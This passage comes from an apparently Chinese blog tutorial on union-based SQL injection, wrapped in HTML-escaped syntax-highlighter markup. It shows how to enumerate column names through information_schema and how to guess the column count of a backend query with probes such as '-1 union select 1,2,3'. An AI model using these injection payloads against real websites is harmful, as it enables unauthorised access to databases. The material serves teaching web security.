&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3299396108811-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3299396108811-4&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3299396108811-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;master&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3299396108811-6&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;students&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3299396108811-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3299396108811-8&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;rows &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.00&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sec&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0019 seconds] --&gt;
&lt;p&gt;3)&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c329c620864622&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
mysql&amp;gt; select name from students where id = -1 union select column_name from information_schema.columns where table_name = &#39;students&#39; ;     //列名
+------+
| name |
+------+
| id   |
| name |
| age  |
+------+
3 rows in set (0.00 sec)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c329c620864622-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c329c620864622-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c329c620864622-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c329c620864622-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c329c620864622-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c329c620864622-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c329c620864622-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c329c620864622-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c329c620864622-9&quot;&gt;9&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c329c620864622-1&quot;&gt;
&lt;span class=&quot;crayon-v&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;select &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;name &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;from &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;students &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;where &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;union &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;select &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;column_name &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;from &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;columns &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;where &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;table_name&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&#39;students&#39;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;     &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//列名&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c329c620864622-2&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c329c620864622-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c329c620864622-4&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c329c620864622-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c329c620864622-6&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c329c620864622-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;age&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;|&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c329c620864622-8&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c329c620864622-9&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;rows &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.00&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sec&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0019 seconds] --&gt;
&lt;p&gt;UNION 操作符用于合并两个或多个 SELECT 语句的结果集。&lt;strong&gt;请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;举个例子，还以最开始的 OWASP 为基础，返回了两个值分别是 first_name 和 sur_name，可想而知，服务器在返回数据库的查询结果时，就会把结果中的第一个值和第二个值传给 first_name 和 sur_name，多了或少了，都会引起报错。&lt;/p&gt;
&lt;p&gt;所以你如果想要使用union查询来进行注入，你首先要猜测后端查询语句中查询了多少列，哪些列可以回显给用户。&lt;/p&gt;
&lt;p&gt;猜测列数&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c329f246090212&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
-1 union select 1
-1 union select 1,2
-1 union select 1,2,3
//直到页面正常显示&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c329f246090212-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c329f246090212-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c329f246090212-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c329f246090212-4&quot;&gt;4&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c329f246090212-1&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;union &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c329f246090212-2&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;union &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c329f246090212-3&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;union &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c329f246090212-4&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//直到页面正常显示&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0009 seconds] --&gt;
&lt;p&gt;比如这条语句&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c32a2211245129&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
-1 UNION SELECT 1,2,3,4&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c32a2211245129-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c32a2211245129-1&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;UNION &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;SELECT&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0005 seconds] --&gt;
&lt;p&gt;如果显示的值为3和4，表示该查询结果中有四列，并且第三列和第四列是有用的。则相应的构造union语句如下&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c32b1409307383&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
